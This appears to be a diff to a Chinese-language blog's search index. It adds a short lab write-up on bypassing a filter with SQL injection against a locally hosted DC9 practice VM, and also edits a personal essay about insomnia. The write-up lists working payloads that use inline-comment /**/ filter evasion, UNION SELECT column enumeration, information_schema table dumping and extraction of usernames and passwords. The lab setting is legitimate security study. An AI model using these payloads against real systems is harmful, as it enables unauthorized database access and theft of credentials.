@@ -4,6 +4,33 @@
   
   
   <entry>
+    <title>简单的sql注入绕过</title>
+    <link href="/2022/05/02/sql/"/>
+    <url>/2022/05/02/sql/</url>
+    
+    <content type="html"><![CDATA[<h1 id="一、前言"><a href="#一、前言" class="headerlink" title="一、前言"></a>一、前言</h1><p>群里一位师傅遇到了本地靶场sql注入的问题，判断出注入但是无法进行下一步，sqlmap也是跑不了。</p><h1 id="二、过程"><a href="#二、过程" class="headerlink" title="二、过程"></a>二、过程</h1><p>通过跟师傅交流大概知道了是什么问题，并通过向日葵远程师傅的电脑。</p><p><strong>本地搭建的DC9靶机：</strong></p><p>搜索框注入：</p><p>搜索Mark正常输出用户信息，加<code>&#39;</code>则不输出信息，加<code>#</code>则输出信息，从而得知存在sql注入。</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs tex">Mark正常输出用户信息<br>Mark&#x27; 不输出信息<br>Mark&#x27;<span class="hljs-params">#</span>正常输出用户信息   <br>从而得知存在sql注入<br>Mark&#x27; order by 5<span class="hljs-params">#</span>   无论在&#x27;<span class="hljs-params">#</span>里输入任何语句都返回错误，导致判断不了字段，怀疑存在过滤行为。<br>使用内联注释绕过<br>Mark&#x27;/**/order/**/by/**/6<span class="hljs-params">#</span>   返回正常  <br>Mark&#x27;/**/order/**/by/**/7<span class="hljs-params">#</span> 返回错误<br>从而得知字段为6<br>Mark&#x27;/**/union/**/select/**/1,2,3,4,5,6<span class="hljs-params">#</span><br>页面中得到返回数据值2等等....<br>查询数据库名：<br>Mark&#x27;/**/union/**/select/**/1,database(),3,4,5,6<span class="hljs-params">#</span>得到数据库<br><br>Mark&#x27;/**/union/**/select/**/1,group<span class="hljs-built_in">_</span>concat(table<span class="hljs-built_in">_</span>name),3,4,5,6/**/from/**/information<span class="hljs-built_in">_</span>schema.tables/**/where /**/table<span class="hljs-built_in">_</span>schema=&#x27;数据库名&#x27;<span class="hljs-params">#</span>得到数据库中的表<br><br>Mark&#x27;/**/union/**/select/**/1,group<span class="hljs-built_in">_</span>concat(Username,Password),3,4,5,6/**/from/**/User<span class="hljs-params">#</span> 得到字段信息<br><br></code></pre></td></tr></table></figure>]]></content>
+    
+    
+    <categories>
+      
+      <category>安全笔记</category>
+      
+      <category>日常笔记</category>
+      
+    </categories>
+    
+    
+    <tags>
+      
+      <tag>sql注入</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
     <title>dos中的转义字符</title>
     <link href="/2022/05/01/dos%E4%B8%AD%E7%9A%84%E8%BD%AC%E4%B9%89%E5%AD%97%E7%AC%A6/"/>
     <url>/2022/05/01/dos%E4%B8%AD%E7%9A%84%E8%BD%AC%E4%B9%89%E5%AD%97%E7%AC%A6/</url>
@@ -15,7 +42,7 @@
       
       <category>安全笔记</category>
       
-      <category>学习笔记</category>
+      <category>日常笔记</category>
       
     </categories>
     
@@ -96,7 +123,7 @@
     <link href="/2022/04/15/%E5%A4%B1%E7%9C%A0/"/>
     <url>/2022/04/15/%E5%A4%B1%E7%9C%A0/</url>
     
-    <content type="html"><![CDATA[<h3 id="失眠"><a href="#失眠" class="headerlink" title="失眠"></a>失眠</h3><p>　　一直都很喜欢夜晚的宁静，享受这种宁静的感觉，也常因为焦虑而失眠。凌晨1:30分洗了个澡便在床上躺着，可迟迟也不能入眠，拿起手机看了看已经3:30分，就这样我又失眠了，丝毫没有一点困意，于是我便起床有了这篇文章。</p><p>　　坐在电脑前听着门外的汽车声，不知此刻的脑子在想着什么，不知道要思考什么，更不知道随着年龄的增加自己变得越来越焦虑，生活的焦虑，工作的焦虑。</p><p>　　有时候，焦虑是一种莫名的情绪，它让我对未来充满了恐惧，而有时候焦虑又是一种可怕的力量，它让我们深陷在战战兢兢的黑暗里，迷失在犹犹豫豫的纠结中。可有的时候，焦虑又成为了一种神秘的力量，它会在无形中给予我们压力，逼着我们做好迎接它到来的准备，以至于让我们在困境中爆发潜能，得到我们最初所无法预估的结果。</p><p>　　其实，现在的年轻人几乎每个人都焦虑，焦虑是一种正常的心理状态，无论一个人有多么强悍，多么卓越，在做事的时候，在谋事的时候，他的内心深处总是会有一丝不安的动乱分子在搅动心神。当然，我所说的这种焦虑不仅仅是一种生理上的自然反应，也不是一种身体激素的正常刺激，而是一种来自自我精神上的恐吓。事实上，焦虑与一个人的内心承受能力有关系，也与一个人的精神抗压能力有关系。</p><p>　　事实上，如果一个人足够坚强，足够自信，足够强大，那么他的焦虑情绪就会减少很多，这些焦虑感也不会成为他取得成功的阻碍。相反，如果一个人的能力不出众，精神不剽悍，自信不充足，那么他就会随时随刻充满了恐惧，而且会下意识的把这种焦虑感放到到一百倍，乃至于让自己举步维艰，根本无法触碰到成功的大门。</p><p>　　因此，必须客观的对待焦虑，正确的看待焦虑，只有这样，才不会被焦虑控制，被焦虑摆布。</p>]]></content>
+    <content type="html"><![CDATA[<h3 id="失眠"><a href="#失眠" class="headerlink" title="失眠"></a>失眠</h3><p>　　一直都很喜欢夜晚的宁静，享受这种宁静的感觉，也常因为焦虑而失眠。凌晨1:30分洗了个澡便在床上躺着，可迟迟也不能入眠，拿起手机看了看已经3:30分，就这样我又失眠了，丝毫没有一点困意，于是我便有了这篇文章。</p><p>　　坐在电脑前听着门外的汽车声，不知此刻的脑子在想着什么，不知道要思考什么，更不知道随着年龄的增加自己变得越来越焦虑，生活的焦虑，工作的焦虑。</p><p>　　有时候，焦虑是一种莫名的情绪，它让我对未来充满了恐惧，而有时候焦虑又是一种可怕的力量，它让我们深陷在战战兢兢的黑暗里，迷失在犹犹豫豫的纠结中。可有的时候，焦虑又成为了一种神秘的力量，它会在无形中给予我们压力，逼着我们做好迎接它到来的准备，以至于让我们在困境中爆发潜能，得到我们最初所无法预估的结果。</p><p>　　其实，现在的年轻人几乎每个人都焦虑，焦虑是一种正常的心理状态，无论一个人有多么强悍，多么卓越，在做事的时候，在谋事的时候，他的内心深处总是会有一丝不安的动乱分子在搅动心神。当然，我所说的这种焦虑不仅仅是一种生理上的自然反应，也不是一种身体激素的正常刺激，而是一种来自自我精神上的恐吓。事实上，焦虑与一个人的内心承受能力有关系，也与一个人的精神抗压能力有关系。</p><p>　　事实上，如果一个人足够坚强，足够自信，足够强大，那么他的焦虑情绪就会减少很多，这些焦虑感也不会成为他取得成功的阻碍。相反，如果一个人的能力不出众，精神不剽悍，自信不充足，那么他就会随时随刻充满了恐惧，而且会下意识的把这种焦虑感放到到一百倍，乃至于让自己举步维艰，根本无法触碰到成功的大门。</p><p>　　因此，必须客观的对待焦虑，正确的看待焦虑，只有这样，才不会被焦虑控制，被焦虑摆布。</p>]]></content>
     
     
     <categories>
